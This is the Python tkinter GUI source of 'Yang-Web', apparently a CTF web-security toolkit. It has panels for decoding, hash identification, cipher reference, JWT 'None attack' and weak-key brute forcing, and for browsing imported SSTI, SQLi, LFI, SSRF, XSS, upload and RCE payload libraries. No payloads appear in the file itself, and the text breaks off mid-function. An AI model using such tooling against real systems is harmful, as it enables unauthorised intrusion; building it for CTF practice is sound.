# -*- coding: utf-8 -*-
"""Yang-Web 图形界面 (tkinter).



零外部依赖，Python 自带 tkinter。

布局: 左侧功能树 + 右侧内容区，Tab 式切换。

"""

import tkinter as tk

from tkinter import ttk, scrolledtext, messagebox

import sys

import os



# 导入核心模块

from .core.decoder import (chain_decode, brute_decode, detect_encoding, DECODERS,

    decode_base64, decode_base32, decode_base16, decode_base58, decode_base85,

    decode_url, decode_html, decode_rot13, decode_binary, decode_octal,

    decode_decimal, decode_morse, decode_unicode_escape)

from .core.hashid import identify as hash_identify

from .core.jwt import decode_jwt, analyze_jwt, none_attack, brute_jwt, BUILTIN_WORDLIST

from .core.misc_crypto import (

    CIPHER_TYPES, list_ciphers, search_ciphers, get_cipher,

    get_image_path, get_image2_path, get_text_content, get_categories,

    encode as mc_encode, decode as mc_decode,

)

from .payloads import ssti, sqli, lfi, ssrf, xss, php, upload



try:

    from .payloads.rce import RCE_CMD, RCE_BYPASS

except Exception:

    RCE_CMD = {}

    RCE_BYPASS = {}





BG = "#1e1e2e"

FG = "#cdd6f4"

ACCENT = "#89b4fa"

GREEN = "#a6e3a1"

RED = "#f38ba8"

YELLOW = "#f9e2af"

DARK = "#181825"

INPUT_BG = "#313244"

BORDER = "#45475a"



# ── 主题 ──



def apply_theme(root):

    root.configure(bg=BG)

    style = ttk.Style()

    style.theme_use("clam")

    style.configure("TNotebook", background=BG, borderwidth=0)

    style.configure("TNotebook.Tab", background=DARK, foreground=FG, padding=[16, 8],

                    borderwidth=0, font=("Microsoft YaHei UI", 10))

    style.map("TNotebook.Tab", background=[("selected", INPUT_BG)], foreground=[("selected", ACCENT)])

    style.configure("TFrame", background=BG)

    style.configure("TLabel", background=BG, foreground=FG, font=("Microsoft YaHei UI", 10))

    style.configure("TButton", background=INPUT_BG, foreground=FG, borderwidth=1,

                    font=("Microsoft YaHei UI", 10))

    style.configure("TLabelframe", background=BG, foreground=ACCENT, borderwidth=1,

                    font=("Microsoft YaHei UI", 10, "bold"))

    style.configure("TLabelframe.Label", background=BG, foreground=ACCENT)

    style.configure("TCombobox", fieldbackground=INPUT_BG, background=INPUT_BG,

                    foreground=FG, selectbackground=ACCENT)



# ── 辅助 ──



def _scrollable_text(parent, height=12, width=80):

    frame = tk.Frame(parent, bg=BG)

    txt = tk.Text(frame, height=height, width=width, bg=INPUT_BG, fg=FG,

                  insertbackground=ACCENT, relief="flat", borderwidth=0,

                  font=("Cascadia Code", 10), padx=10, pady=8,

                  wrap=tk.WORD)

    scroll = tk.Scrollbar(frame, command=txt.yview)

    txt.configure(yscrollcommand=scroll.set)

    txt.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

    scroll.pack(side=tk.RIGHT, fill=tk.Y)

    return frame, txt



def _label(parent, text, fg=FG, font_size=10, bold=False, pady=4):

    w = tk.Label(parent, text=text, bg=BG, fg=fg,

                 font=("Microsoft YaHei UI", font_size, "bold" if bold else "normal"))

    w.pack(anchor="w", pady=(pady, 0))

    return w



def _button(parent, text, command, accent=False, width=None):

    bg = ACCENT if accent else INPUT_BG

    fg = DARK if accent else FG

    btn = tk.Button(parent, text=text, command=command, bg=bg, fg=fg,

                    activebackground=BORDER, activeforeground=FG, relief="flat",

                    borderwidth=0, padx=16, pady=6, cursor="hand2",

                    font=("Microsoft YaHei UI", 10, "bold" if accent else "normal"))

    if width:

        btn.configure(width=width)

    btn.pack(anchor="w", pady=2)

    return btn



def _entry(parent, width=60):

    e = tk.Entry(parent, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                 relief="flat", borderwidth=0, font=("Cascadia Code", 11),

                 width=width)

    e.pack(fill=tk.X, pady=(2, 6), ipady=4)

    return e



def _combo(parent, values, default=None, **kw):

    cb = ttk.Combobox(parent, values=values, state="readonly",

                      font=("Cascadia Code", 10), **kw)

    if default:

        cb.set(default)

    cb.pack(fill=tk.X, pady=(2, 6))

    return cb



def _output_area(parent, height=18):

    """返回 (frame, text_widget) 方便需要自定义配置."""

    return _scrollable_text(parent, height=height)



def _append(txt_widget, text, tag=None):

    txt_widget.configure(state="normal")

    if not text.endswith('\n'):

        text = text + '\n'

    txt_widget.insert(tk.END, text)

    txt_widget.configure(state="disabled")

    txt_widget.see(tk.END)



def _clear_output(txt_widget):

    txt_widget.configure(state="normal")

    txt_widget.delete("1.0", tk.END)

    txt_widget.configure(state="disabled")





# ═══════════════════════════════════════════════════════════

#  各功能面板

# ═══════════════════════════════════════════════════════════



class DecodePanel(tk.Frame):

    """智能解码面板 — 粘贴即用，自动识别+一键解码."""

    def __init__(self, parent):

        super().__init__(parent, bg=BG)

        _label(self, "🔓 智能解码器", fg=ACCENT, font_size=16, bold=True, pady=8)

        _label(self, "粘贴密文 → 自动识别编码类型 → 一键解码 | 支持 14 种编码", fg=YELLOW, font_size=9)



        # ── Input area ──

        input_frame = tk.Frame(self, bg=DARK, bd=2, relief="groove")

        input_frame.pack(fill=tk.X, padx=4, pady=(8, 4))

        _label(input_frame, "📥 粘贴密文到这里:", fg=ACCENT, font_size=10, pady=2)

        self.input_text = scrolledtext.ScrolledText(input_frame, height=5,

                                                     bg=INPUT_BG, fg=FG,

                                                     insertbackground=ACCENT,

                                                     relief="flat", borderwidth=0,

                                                     font=("Cascadia Code", 11),

                                                     wrap=tk.WORD)

        self.input_text.pack(fill=tk.X, padx=6, pady=(0, 6))



        # ── Action buttons ──

        btn_frame = tk.Frame(self, bg=BG)

        btn_frame.pack(anchor="w", pady=4, padx=4)

        tk.Button(btn_frame, text="🔍 识别编码", command=self._detect,

                  bg=ACCENT, fg=DARK, activebackground=GREEN, relief="flat",

                  padx=16, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))

        tk.Button(btn_frame, text="💣 暴力全部", command=self._brute,

                  bg=YELLOW, fg=DARK, activebackground=ACCENT, relief="flat",

                  padx=16, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))

        tk.Button(btn_frame, text="🔗 链式解码", command=self._chain,

                  bg=GREEN, fg=DARK, activebackground=ACCENT, relief="flat",

                  padx=16, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))

        tk.Button(btn_frame, text="🗑 清空", command=self._clear_all,

                  bg=RED, fg=DARK, activebackground="#ff6b6b", relief="flat",

                  padx=16, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT)



        # ── Detection result + quick-decode buttons (shown after detect) ──

        self.detect_frame = tk.Frame(self, bg=BG)

        self.detect_frame.pack(fill=tk.X, padx=4, pady=2)

        self.detect_label = tk.Label(self.detect_frame, text="", bg=BG, fg=YELLOW,

                                      font=("Microsoft YaHei UI", 9, "bold"),

                                      anchor="w", justify="left")

        self.detect_label.pack(anchor="w")

        self.detect_btns = tk.Frame(self.detect_frame, bg=BG)

        self.detect_btns.pack(anchor="w", pady=2)



        # ── Manual picker ──

        manual_bar = tk.Frame(self, bg=BG)

        manual_bar.pack(fill=tk.X, padx=4, pady=2)

        tk.Label(manual_bar, text="手动选择:", bg=BG, fg=FG,

                 font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=(0, 4))

        manual_opts = ["base64", "base32", "base16/hex", "url", "html", "unicode",

                       "binary", "octal", "decimal", "rot13", "morse", "base58", "base85"]

        self.manual_var = tk.StringVar(value="base64")

        self.manual_cb = ttk.Combobox(manual_bar, textvariable=self.manual_var,

                                       values=manual_opts, state="readonly", width=14)

        self.manual_cb.pack(side=tk.LEFT, padx=2)

        tk.Button(manual_bar, text="Decode", command=self._manual_decode,

                  bg=INPUT_BG, fg=ACCENT, activebackground=BORDER, relief="flat",

                  padx=12, pady=2, cursor="hand2",

                  font=("Microsoft YaHei UI", 9, "bold")).pack(side=tk.LEFT, padx=2)



        # ── Output ──

        _label(self, "📤 解码结果:", pady=8)

        self.output_frame, self.output = _output_area(self, 12)

        self.output_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))



    def _get_text(self):

        return self.input_text.get("1.0", tk.END).strip()



    def _clear_all(self):

        self.input_text.delete("1.0", tk.END)

        _clear_output(self.output)

        for w in self.detect_btns.winfo_children():

            w.destroy()

        self.detect_label.config(text="")



    def _detect(self):

        """检测编码类型并显示可点击解码按钮."""

        text = self._get_text()

        _clear_output(self.output)

        for w in self.detect_btns.winfo_children():

            w.destroy()

        if not text:

            self.detect_label.config(text="⚠ 请先粘贴密文")

            _append(self.output, "⚠ 请先粘贴密文到上方输入框")

            return



        # Run detection

        detections = detect_encoding(text)

        if not detections:

            self.detect_label.config(text="❌ 未识别到已知编码")

            _append(self.output, "❌ 自动检测未识别到已知编码类型\n\n💡 试试:\n  • 点「💣 暴力全部」尝试所有解码器\n  • 用「手动选择」下拉框指定编码")

            return



        # Show detection results

        lines = [f"✅ 检测到 {len(detections)} 种可能编码:"]

        for enc_id, desc, conf in detections[:8]:

            emoji = "🟢" if conf >= 80 else "🟡" if conf >= 50 else "🟠"

            lines.append(f"  {emoji} {desc} — 置信度 {conf}%")

        self.detect_label.config(text="\n".join(lines))



        # Show results + quick-decode buttons

        _append(self.output, f"📋 输入 ({len(text)} 字符):\n  {text[:200]}\n\n🔍 检测结果:\n")

        for enc_id, desc, conf in detections[:8]:

            _append(self.output, f"  {'🟢' if conf >= 80 else '🟡' if conf >= 50 else '🟠'} {desc} ({enc_id}) — {conf}%")



        # Create quick-decode buttons for top results

        for enc_id, desc, conf in detections[:5]:

            btn = tk.Button(self.detect_btns,

                           text=f"🔓 用 {desc.split()[0]} 解码",

                           command=lambda eid=enc_id, edesc=desc: self._quick_decode(eid, edesc),

                           bg=INPUT_BG, fg=GREEN, activebackground=GREEN,

                           activeforeground=DARK, relief="flat",

                           padx=10, pady=2, cursor="hand2",

                           font=("Microsoft YaHei UI", 9))

            btn.pack(side=tk.LEFT, padx=2, pady=2)



    def _quick_decode(self, enc_id, desc):

        """Quick decode with a specific encoding."""

        text = self._get_text()

        decoder_func, _ = DECODERS.get(enc_id, (None, None))

        if not decoder_func:

            _append(self.output, f"\n❌ 解码器 {desc} 不可用")

            return

        try:

            result = decoder_func(text)

            _append(self.output, f"\n{'─'*50}\n🔓 使用 {desc} 解码:\n{'─'*50}\n{result}")

        except Exception as e:

            _append(self.output, f"\n❌ {desc} 解码失败: {e}")



    def _manual_decode(self):

        """Manually decode with selected encoding."""

        text = self._get_text()

        if not text:

            _clear_output(self.output)

            _append(self.output, "⚠ 请先粘贴密文")

            return

        choice = self.manual_var.get().split("/")[0]

        decoders = {

            "base64": ("base64", decode_base64),

            "base32": ("base32", decode_base32),

            "base16": ("base16", decode_base16),

            "url": ("url", decode_url),

            "html": ("html", decode_html),

            "unicode": ("unicode", decode_unicode_escape),

            "binary": ("binary", decode_binary),

            "octal": ("octal", decode_octal),

            "decimal": ("decimal", decode_decimal),

            "rot13": ("rot13", decode_rot13),

            "morse": ("morse", decode_morse),

            "base58": ("base58", decode_base58),

            "base85": ("base85", decode_base85),

        }

        if choice not in decoders:

            _append(self.output, f"❌ 不支持的编码: {choice}")

            return

        enc_id, func = decoders[choice]

        _clear_output(self.output)

        try:

            result = func(text)

            _append(self.output, f"📥 {text[:80]}...\n\n🔓 用 {enc_id} 解码:\n{'─'*50}\n{result}")

        except Exception as e:

            _append(self.output, f"❌ {enc_id} 解码失败: {e}")



    def _chain(self):

        """Chain decode: recursively decode until can't."""

        text = self._get_text()

        _clear_output(self.output)

        if not text:

            _append(self.output, "⚠ 请先粘贴密文")

            return

        _append(self.output, f"📋 输入 ({len(text)} 字符):\n  {text[:200]}\n\n🔗 链式解码:\n")

        try:

            steps = chain_decode(text)

            if not steps:

                _append(self.output, "❌ 未识别到可链式解码的编码")

                return

            for i, step in enumerate(steps):

                enc_id, enc_desc, decoded = step

                _append(self.output, f"  Step {i+1}: {enc_desc} ({enc_id})")

                _append(self.output, f"           → {decoded[:150]}\n")

            _append(self.output, f"\n{'═'*50}\n✅ 最终结果: {steps[-1][2]}\n{'═'*50}")

        except Exception as e:

            _append(self.output, f"❌ 链式解码失败: {e}\n\n💡 试试「🔍 识别编码」或「💣 暴力全部」")



    def _brute(self):

        """Brute force: try ALL decoders."""

        text = self._get_text()

        _clear_output(self.output)

        if not text:

            _append(self.output, "⚠ 请先粘贴密文")

            return

        _append(self.output, f"📋 输入 ({len(text)} 字符):\n  {text[:200]}\n\n💣 暴力尝试所有解码器:\n")

        try:

            results = brute_decode(text)

            if not results:

                _append(self.output, "\n❌ 所有解码器均未得到可读结果")

                return

            _append(self.output, f"\n找到 {len(results)} 个可读结果:\n{'─'*50}")

            for r in results:

                enc_id, enc_desc, decoded = r[0], r[1], r[2]

                confidence = r[3] if len(r) > 3 else 50

                marker = "⭐" if confidence >= 80 else "  "

                _append(self.output, f"\n{marker} {enc_desc} ({enc_id}): {decoded[:200]}")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")





class PayloadPanel(tk.Frame):

    """通用 Payload 面板"""

    def __init__(self, parent, title, emoji, get_data_fn, search_fn=None, analyzer_fn=None):

        super().__init__(parent, bg=BG)

        self.get_data = get_data_fn

        self.search_fn = search_fn

        self.analyzer_fn = analyzer_fn



        _label(self, f"{emoji} {title}", fg=ACCENT, font_size=16, bold=True, pady=8)



        # 靶场分析条 (Upload 专用)

        if analyzer_fn:

            analyze_frame = tk.Frame(self, bg=DARK)

            analyze_frame.pack(fill=tk.X, padx=4, pady=(0,4))

            _label(analyze_frame, "🎯 分析:", fg=ACCENT, pady=0, font_size=11)

            self.analyze_entry = tk.Entry(analyze_frame, bg=INPUT_BG, fg=FG,

                insertbackground=ACCENT, relief="flat", borderwidth=0,

                font=("Cascadia Code", 11))

            self.analyze_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=6, ipady=4)

            self.analyze_entry.bind("<Return>", lambda e: self._do_analyze())

            tk.Button(analyze_frame, text="分析", command=self._do_analyze,

                bg=ACCENT, fg=DARK, relief="flat", padx=14, pady=4,

                cursor="hand2", font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=(2,0))



        # 搜索

        search_frame = tk.Frame(self, bg=BG)

        search_frame.pack(fill=tk.X, pady=4)

        _label(search_frame, "🔍 搜索:", pady=0)

        self.search_entry = tk.Entry(search_frame, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                                     relief="flat", borderwidth=0, font=("Cascadia Code", 11))

        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(8, 4), ipady=4)

        tk.Button(search_frame, text="搜索", command=self._search, bg=ACCENT, fg=DARK,

                  relief="flat", padx=12, pady=4, cursor="hand2",

                  font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT)



        # 分类选择 (搜索下方)

        top = tk.Frame(self, bg=BG)

        top.pack(fill=tk.X, pady=4)

        _label(top, "分类:", pady=0)

        self.category_var = tk.StringVar(value="-- 选择分类 --")

        self.category_combo = _combo(top, ["-- 选择分类 --"], textvariable=self.category_var)

        self.category_combo.bind("<<ComboboxSelected>>", lambda e: self._refresh())

        self.top_frame = top



        self.output_frame, self.output = _output_area(self, 22)

        self.output_frame.pack(fill=tk.BOTH, expand=True)

        _append(self.output, "👆 请在上方选择一个分类查看 Payload")



    def _refresh(self):

        _clear_output(self.output)

        cat = self.category_var.get()

        if not cat or cat == "-- 选择分类 --":

            _append(self.output, "👆 请在上方选择一个分类查看 Payload")

            return

        try:

            data = self.get_data(cat)

            self._display(data)

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")



    def _do_analyze(self):

        """运行靶场分析."""

        if not self.analyzer_fn:

            return

        blacklist = self.analyze_entry.get().strip()

        if not blacklist:

            _clear_output(self.output)

            _append(self.output, "👆 请在上方输入靶场黑名单 (如: php,php3,php5)")

            return

        _clear_output(self.output)

        try:

            result = self.analyzer_fn(blacklist)

            _append(self.output, result)

        except Exception as e:

            _append(self.output, f"❌ 分析出错: {e}")



    def _display(self, data):

        if isinstance(data, dict):

            for key, items in data.items():

                _append(self.output, f"\n▸ {key}\n")

                if isinstance(items, list):

                    for item in items:

                        if isinstance(item, str):

                            _append(self.output, f"  • {item}")

                        elif isinstance(item, dict):

                            _append(self.output, f"  • {item.get('name','?')}")

                            if 'payload' in item:

                                _append(self.output, f"    {item['payload'][:150]}")

                            if 'tip' in item:

                                _append(self.output, f"    💡 {item['tip'][:120]}")

                elif isinstance(items, dict):

                    for sub_key, sub_items in items.items():

                        if isinstance(sub_items, list):

                            _append(self.output, f"  ▸ {sub_key}:")

                            for item in sub_items:

                                _append(self.output, f"    • {str(item)[:200]}")

                        else:

                            _append(self.output, f"  ▸ {sub_key}: {sub_items}")

                else:

                    _append(self.output, f"  {items}")



    def _search(self):

        kw = self.search_entry.get().strip()

        if not kw or not self.search_fn:

            return

        _clear_output(self.output)

        results = self.search_fn(kw)

        if results:

            _append(self.output, f"🔍 '{kw}' 的搜索结果 ({len(results)} 条):\n")

            for r in results[:30]:

                cat = r.get("category", "")

                nm = r.get("name", "")

                payload = r.get("payload", r.get("content", ""))

                _append(self.output, f"\n  [{cat}] {nm}")

                if payload:

                    _append(self.output, f"  {str(payload)[:200]}")

        else:

            _append(self.output, f"未找到包含 '{kw}' 的结果")



    def set_categories(self, categories):

        self.category_combo["values"] = ["-- 选择分类 --"] + list(categories)

        self.category_combo.set("-- 选择分类 --")





class HashPanel(tk.Frame):

    """Hash 识别面板"""

    def __init__(self, parent):

        super().__init__(parent, bg=BG)

        _label(self, "🔍 Hash 类型识别", fg=ACCENT, font_size=16, bold=True, pady=8)

        _label(self, "支持 40+ 种 Hash 算法自动匹配", fg=YELLOW, font_size=9)



        _label(self, "📥 输入 Hash:", pady=8)

        self.hash_entry = _entry(self, 70)

        self.hash_entry.bind("<Return>", lambda e: self._identify())



        tk.Button(self, text="🔍 识别", command=self._identify, bg=ACCENT, fg=DARK,

                  relief="flat", padx=20, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 11, "bold")).pack(anchor="w", pady=4)



        _label(self, "📤 识别结果:", pady=8)

        self.output_frame, self.output = _output_area(self, 14)

        self.output_frame.pack(fill=tk.BOTH, expand=True)



    def _identify(self):

        _clear_output(self.output)

        h = self.hash_entry.get().strip()

        if not h:

            _append(self.output, "⚠ 请先输入 Hash 值")

            return

        try:

            result = hash_identify(h)

            _append(self.output, f"📋 输入: {h[:80]}")

            _append(self.output, f"📏 长度: {len(h)} 字符")

            _append(self.output, f"\n📊 可能的算法:")

            if isinstance(result, list):

                for r in result:

                    _append(self.output, f"  • {r}")

            elif isinstance(result, dict):

                for algo, confidence in result.items():

                    _append(self.output, f"  • {algo} (置信度: {confidence})")

            else:

                _append(self.output, f"  {result}")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")





class JWTPanel(tk.Frame):

    """JWT 分析面板"""

    def __init__(self, parent):

        super().__init__(parent, bg=BG)

        _label(self, "🔑 JWT 分析与攻击", fg=ACCENT, font_size=16, bold=True, pady=8)

        _label(self, "解析 → 分析 → None 攻击 → 弱密钥爆破 → 伪造", fg=YELLOW, font_size=9)



        _label(self, "📥 JWT Token:", pady=8)

        self.jwt_entry = _entry(self, 70)



        btn_frame = tk.Frame(self, bg=BG)

        btn_frame.pack(anchor="w", pady=4)

        for label, cmd in [("📋 解析", self._decode), ("🔍 分析", self._analyze),

                           ("⚡ None攻击", self._none), ("💣 弱密钥爆破", self._brute)]:

            tk.Button(btn_frame, text=label, command=cmd, bg=INPUT_BG, fg=FG,

                      activebackground=ACCENT, relief="flat", padx=12, pady=5,

                      cursor="hand2", font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT, padx=2)



        _label(self, "📤 结果:", pady=8)

        self.output_frame, self.output = _output_area(self, 16)

        self.output_frame.pack(fill=tk.BOTH, expand=True)



    def _get_token(self):

        return self.jwt_entry.get().strip()



    def _decode(self):

        _clear_output(self.output)

        t = self._get_token()

        if not t:

            _append(self.output, "⚠ 请输入 JWT")

            return

        try:

            header, payload = decode_jwt(t)

            _append(self.output, f"📋 Header:\n{_pretty_json(header)}\n")

            _append(self.output, f"📋 Payload:\n{_pretty_json(payload)}")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")



    def _analyze(self):

        _clear_output(self.output)

        t = self._get_token()

        if not t: return

        try:

            r = analyze_jwt(t)

            for k, v in r.items():

                _append(self.output, f"{k}: {v}\n")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")



    def _none(self):

        _clear_output(self.output)

        t = self._get_token()

        if not t: return

        try:

            r = none_attack(t)

            _append(self.output, f"⚡ None 算法攻击:\n{r}")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")



    def _brute(self):

        _clear_output(self.output)

        t = self._get_token()

        if not t: return

        _append(self.output, "💣 弱密钥爆破中... (使用内置词库)\n")

        try:

            r = brute_jwt(t)

            if r:

                _append(self.output, f"✅ 密钥找到: {r}")

            else:

                _append(self.output, "❌ 内置词库未匹配")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")





class MiscCryptoPanel(tk.Frame):

    """Misc Crypto – 20+ common cipher types with encode/decode + reference images."""

    def __init__(self, parent):

        super().__init__(parent, bg=BG)

        _label(self, "🔐 Misc Crypto Knowledge Base", fg=ACCENT, font_size=16, bold=True, pady=8)

        _label(self, "20+ CTF Misc 密码类型 — 编码/解码 + 参考图/说明文本", fg=YELLOW, font_size=9)



        # ── Top bar: category + search ──

        top = tk.Frame(self, bg=BG)

        top.pack(fill=tk.X, padx=4, pady=(8, 4))



        tk.Label(top, text="分类:", bg=BG, fg=ACCENT,

                 font=("Microsoft YaHei UI", 11)).pack(side=tk.LEFT, padx=(0, 4))

        cats = ["全部"] + get_categories()

        self.cat_var = tk.StringVar(value="全部")

        self.cat_cb = ttk.Combobox(top, textvariable=self.cat_var, values=cats,

                                    state="readonly", width=16)

        self.cat_cb.pack(side=tk.LEFT, padx=2)

        self.cat_cb.bind("<<ComboboxSelected>>", self._on_cat_change)



        tk.Label(top, text="搜索:", bg=BG, fg=ACCENT,

                 font=("Microsoft YaHei UI", 11)).pack(side=tk.LEFT, padx=(12, 4))

        self.search_var = tk.StringVar()

        self.search_entry = tk.Entry(top, textvariable=self.search_var,

                                      bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                                      relief="flat", font=("Cascadia Code", 11),

                                      width=20)

        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)

        self.search_entry.bind("<KeyRelease>", self._on_search)



        # ── Main area: list + detail ──

        panes = tk.PanedWindow(self, bg=BG, sashwidth=3)

        panes.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)



        # Left: cipher list

        list_frame = tk.Frame(panes, bg=BG)

        panes.add(list_frame, width=260)

        _label(list_frame, "密码类型:", pady=4)

        self.cipher_list = tk.Listbox(list_frame, bg=INPUT_BG, fg=FG,

                                       selectbackground=ACCENT, selectforeground=DARK,

                                       relief="flat", borderwidth=0,

                                       font=("Microsoft YaHei UI", 10), height=18)

        self.cipher_list.pack(fill=tk.BOTH, expand=True, pady=(0, 4))

        self.cipher_list.bind("<<ListboxSelect>>", self._on_cipher_select)



        # Right: detail + io + reference

        right = tk.Frame(panes, bg=BG)

        panes.add(right, width=550)



        # Detail info

        self.info_var = tk.StringVar(value="")

        _label(right, "详情:", pady=4)

        self.info_label = tk.Label(right, textvariable=self.info_var, bg=BG, fg=FG,

                                    anchor="nw", justify="left",

                                    font=("Microsoft YaHei UI", 10),

                                    wraplength=520)

        self.info_label.pack(fill=tk.X, pady=(0, 4))



        # Reference area (image button + text content)

        ref_header = tk.Frame(right, bg=BG)

        ref_header.pack(fill=tk.X, pady=(2, 2))

        tk.Label(ref_header, text="参考内容:", bg=BG, fg=YELLOW,

                 font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT)

        self.view_img_btn = tk.Button(ref_header, text="🖼 查看原图",

                                       command=self._open_image,

                                       bg=INPUT_BG, fg=ACCENT,

                                       activebackground=ACCENT, activeforeground=DARK,

                                       relief="flat", padx=12, pady=3,

                                       cursor="hand2",

                                       font=("Microsoft YaHei UI", 9, "bold"))

        self.view_img2_btn = tk.Button(ref_header, text="🖼 图2",

                                        command=self._open_image2,

                                        bg=INPUT_BG, fg=YELLOW,

                                        activebackground=YELLOW, activeforeground=DARK,

                                        relief="flat", padx=10, pady=3,

                                        cursor="hand2",

                                        font=("Microsoft YaHei UI", 9, "bold"))

        self.img_path_var = tk.StringVar(value="")

        tk.Label(ref_header, textvariable=self.img_path_var, bg=BG, fg=DARK,

                 font=("Cascadia Code", 7)).pack(side=tk.RIGHT, padx=4)



        # Reference text content

        self.ref_frame, self.ref_text = _output_area(right, 10)

        self.ref_frame.pack(fill=tk.BOTH, expand=True, pady=(2, 4))



        # IO area

        io_bar = tk.Frame(right, bg=BG)

        io_bar.pack(fill=tk.X, pady=4)

        tk.Label(io_bar, text="输入:", bg=BG, fg=ACCENT,

                 font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT, padx=(0, 4))

        self.io_entry = tk.Entry(io_bar, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                                  relief="flat", font=("Cascadia Code", 11))

        self.io_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)

        self.io_entry.bind("<Return>", lambda e: self._do_encode())

        tk.Button(io_bar, text="Encode", command=self._do_encode,

                  bg=ACCENT, fg=DARK, activebackground=GREEN, relief="flat",

                  padx=12, pady=3, cursor="hand2",

                  font=("Microsoft YaHei UI", 9, "bold")).pack(side=tk.LEFT, padx=2)

        tk.Button(io_bar, text="Decode", command=self._do_decode,

                  bg=INPUT_BG, fg=ACCENT, activebackground=BORDER, relief="flat",

                  padx=12, pady=3, cursor="hand2",

                  font=("Microsoft YaHei UI", 9, "bold")).pack(side=tk.LEFT, padx=2)



        # Key entry (for vigenere etc.)

        key_bar = tk.Frame(right, bg=BG)

        key_bar.pack(fill=tk.X, pady=(0, 4))

        tk.Label(key_bar, text="密钥:", bg=BG, fg=YELLOW,

                 font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=(0, 4))

        self.key_entry = tk.Entry(key_bar, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                                   relief="flat", font=("Cascadia Code", 11), width=20)

        self.key_entry.pack(side=tk.LEFT, padx=4, ipady=2)



        # Output

        _label(right, "输出:", pady=4)

        self.output_frame, self.output = _output_area(right, 6)

        self.output_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 4))



        # Store state

        self._selected_cid = None

        self._current_image_path = ""



        # Load initial data

        self._ciphers = list_ciphers()

        self._refresh_list()



    def _refresh_list(self):

        """Rebuild the cipher listbox."""

        self.cipher_list.delete(0, tk.END)

        for c in self._ciphers:

            tag = "🔧" if c.get("encode") else "📖"

            self.cipher_list.insert(tk.END, tag + " " + c["name"])



    def _on_cat_change(self, event=None):

        cat = self.cat_var.get()

        if cat == "全部":

            self._ciphers = list_ciphers()

        else:

            self._ciphers = list_ciphers(cat)

        self._refresh_list()

        self._clear_detail()



    def _on_search(self, event=None):

        q = self.search_var.get().strip()

        if q:

            self._ciphers = search_ciphers(q)

        else:

            cat = self.cat_var.get()

            self._ciphers = list_ciphers() if cat == "全部" else list_ciphers(cat)

        self._refresh_list()



    def _on_cipher_select(self, event=None):

        sel = self.cipher_list.curselection()

        if not sel:

            return

        idx = sel[0]

        if idx >= len(self._ciphers):

            return

        info = self._ciphers[idx]

        cid = info.get("id", "")

        _clear_output(self.output)



        # Build info lines

        lines = [

            "名称: " + info["name"],

            "ID:   " + cid,

            "分类: " + info["category"],

            "别名: " + ", ".join(info.get("aliases", []) or ["无"]),

            "描述: " + info["description"],

        ]

        if info.get("features"):

            lines.append("特征: " + ", ".join(info["features"]))

        if info.get("encode"):

            lines.append("状态: 支持编码/解码")

        else:

            lines.append("状态: 仅提供参考图/说明")

        self.info_var.set("\n".join(lines))



        # Show reference: image button + text content

        img = get_image_path(cid)

        img2 = get_image2_path(cid)

        self._current_image_path = img if img else ""

        self._current_image2_path = img2 if img2 else ""



        if img:

            self.view_img_btn.configure(state="normal", bg=INPUT_BG, fg=ACCENT)

            self.img_path_var.set(os.path.basename(img))

            self.view_img_btn.pack(side=tk.LEFT, padx=(8, 0))

        else:

            self.view_img_btn.pack_forget()



        if img2:

            self.view_img2_btn.configure(state="normal")

            self.view_img2_btn.pack(side=tk.LEFT, padx=4)

        else:

            self.view_img2_btn.pack_forget()



        if not img and not img2:

            self.img_path_var.set("")



        # Load and show text content

        _clear_output(self.ref_text)

        txt_content = get_text_content(cid)

        if txt_content:

            _append(self.ref_text, txt_content)

        elif not img and not img2:

            # No image, no text — show algorithm note

            _append(self.ref_text, "[此密码为经典算法，无需参考图/说明文件]")

        else:

            tips = []

            if img:

                tips.append("查看原图")

            if img2:

                tips.append("图2")

            _append(self.ref_text, f"[点击 {', '.join(tips)} 按钮查看参考图片]")



        # Store selected cipher id

        self._selected_cid = cid



    def _clear_detail(self):

        self.info_var.set("")

        self.img_path_var.set("")

        self.view_img_btn.pack_forget()

        self.view_img2_btn.pack_forget()

        _clear_output(self.ref_text)

        self._selected_cid = None

        self._current_image_path = ""

        self._current_image2_path = ""



    def _open_image(self):

        """Open reference image with system viewer."""

        if self._current_image_path and os.path.exists(self._current_image_path):

            try:

                os.startfile(self._current_image_path)

            except Exception as e:

                _clear_output(self.ref_text)

                _append(self.ref_text, "无法打开图片: " + str(e))



    def _open_image2(self):

        """Open second reference image."""

        if self._current_image2_path and os.path.exists(self._current_image2_path):

            try:

                os.startfile(self._current_image2_path)

            except Exception as e:

                _clear_output(self.ref_text)

